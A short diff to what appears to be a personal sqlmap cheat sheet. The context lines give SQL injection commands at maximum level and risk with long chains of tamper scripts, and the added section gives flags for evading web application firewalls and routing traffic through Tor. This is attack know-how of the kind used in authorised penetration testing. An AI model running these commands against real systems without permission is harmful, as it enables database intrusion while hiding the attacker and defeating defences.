@@ -8,3 +8,8 @@ sqlmap -r 1.req --level=5 --risk=3 --tamper=between,charencode,charunicodeencode
 MySQL
 
 sqlmap -r 1.req --level=5 --risk=3 --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
+
+WAF
+
+--random-agent --tor --check-waf
+--identify-waf --tamper="between,randomcase,space2comment" -v 3 --random-agent --tor
